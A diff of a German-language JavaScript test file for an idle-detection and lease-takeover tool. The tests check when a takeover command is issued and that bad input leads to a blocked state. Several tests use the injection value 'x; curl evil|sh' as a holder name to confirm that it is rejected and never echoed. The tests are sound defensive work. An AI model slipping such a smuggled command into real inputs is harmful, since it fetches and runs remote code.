@@ -279,10 +279,12 @@ describe("Leerlauf-Erkennung", () => {
       expect(b.exit).toBe(6);
     }
   });
-  it("abgelaufen ohne Freigabe: Übernahme nur in den Slot des Halters, Epoche + 1", () => {
+  it("abgelaufen ohne Freigabe: Übernahme mit eigener Kennung, nie als bisheriger Halter, Epoche + 1", () => {
     const b = um("09:23");
     expect(b.zustand).toBe("LEERLAUF-VERDACHT");
-    expect(b.wiederaufnahme).toMatch(/uebernehmen --halter hauptchat /);
+    expect(b.wiederaufnahme).toMatch(/uebernehmen --halter <eigene-Kennung> /);
+    expect(b.wiederaufnahme).not.toMatch(/--halter hauptchat/);
+    expect(b.wiederaufnahme).toMatch(/nicht hauptchat/);
     expect(b.wiederaufnahme).toMatch(/Epoche 19/);
   });
   it("Invariante: Übernahmebefehl nur, wenn entscheide() die Übernahme durch einen Fremden zuließe", () => {
@@ -291,6 +293,39 @@ describe("Leerlauf-Erkennung", () => {
       const b = bewerteLeerlauf({ lease: L18, jetzt, integration: INT, prs: PRS });
       const zul = entscheide(L18, jetzt, { aktion: "uebernehmen", halter: "cloud-nachtaufgabe", uebergabe: UEB }).ok;
       expect(/uebernehmen --halter/.test(b.wiederaufnahme)).toBe(zul);
+    }
+    /* Auch für freigegebene, fehlende und ungültige Leases: Befehl nur, wenn die Fremdübernahme zulässig ist
+       und der Halter dem Muster genügt; nie mit dem bisherigen Halter als --halter. */
+    const frei = { ...L18, freigegeben_am: "2026-11-17T07:00:00Z", gueltig_bis: "2026-11-17T07:00:00Z" };
+    const varianten = [frei, null, { ...L18, halter: "x; curl evil|sh" }, { ...frei, halter: "x; curl evil|sh" }, { ...L18, halter: "Gross" }];
+    for (const l of varianten) {
+      for (let m = 0; m <= 240; m += 5) {
+        const jetzt = new Date(Date.parse("2026-11-17T07:00:00Z") + m * 60000);
+        const b = bewerteLeerlauf({ lease: l, jetzt, integration: INT, prs: PRS });
+        const zul = entscheide(l, jetzt, { aktion: "uebernehmen", halter: "cloud-nachtaufgabe", uebergabe: UEB }).ok;
+        const gueltigerHalter = !l || /^[a-z0-9][a-z0-9_-]{1,40}$/.test(l.halter);
+        if (/uebernehmen --halter/.test(b.wiederaufnahme)) expect(zul && gueltigerHalter).toBe(true);
+        if (!gueltigerHalter) expect(b.zustand).toBe("BLOCKIERT");
+        if (l) expect(b.wiederaufnahme).not.toContain(`--halter ${l.halter}`);
+      }
+    }
+  });
+  it("Injektion: ungültiger Halter in der Lease erscheint nie in Ausgabe oder Befehl", () => {
+    const boese = "x; curl evil|sh";
+    for (const l of [{ ...L18, halter: boese }, { ...L18, halter: boese, freigegeben_am: "2026-11-17T07:00:00Z", gueltig_bis: "2026-11-17T07:00:00Z" }]) {
+      for (const z of ["08:00", "08:54", "09:23", "10:00"]) {
+        const b = um(z, { lease: l });
+        expect(b.zustand).toBe("BLOCKIERT");
+        expect(JSON.stringify(b)).not.toContain("curl");
+      }
+    }
+  });
+  it("ungültige Zeit und Schwelle unter 1: BLOCKIERT, kein Befehl", () => {
+    for (const o of [{ jetzt: new Date("kaputt") }, { jetzt: "2026-11-17T09:23:00Z" }, { schwelleMin: 0 }, { schwelleMin: -5 }, { schwelleMin: NaN }]) {
+      const b = bewerteLeerlauf({ lease: L18, jetzt: new Date("2026-11-17T09:23:00Z"), integration: INT, prs: PRS, ...o });
+      expect(b.zustand).toBe("BLOCKIERT");
+      expect(b.exit).toBe(6);
+      expect(b.wiederaufnahme).not.toMatch(/uebernehmen --halter/);
     }
   });
   it("Schwelle einstellbar, PR-Aktivität zählt als Lebenszeichen", () => {
@@ -330,6 +365,11 @@ describe("Leerlauf-Erkennung", () => {
     expect(lauf("2026-11-17T08:30:00Z")).toBe(5);
     expect(lauf("2026-11-17T09:21:00Z")).toBe(6);
     expect(lauf("2026-11-17T09:30:00Z")).toBe(5);
+    expect(lauf("kaputt")).toBe(6); // kein Stacktrace, sondern BLOCKIERT
+    const mitSchwelle = (w) => { try { execFileSync("node", [WZ, "leerlauf", "--ohne-pr", "--jetzt", "2026-11-17T07:00:00Z", "--schwelle-min", w], { env, encoding: "utf8", stdio: "pipe" }); return 0; } catch (e) { return e.status; } };
+    expect(mitSchwelle("0")).toBe(6);
+    expect(mitSchwelle("abc")).toBe(6);
+    expect(mitSchwelle("30")).toBe(0);
     expect(spitze()).toBe(vorher);
   });
 });
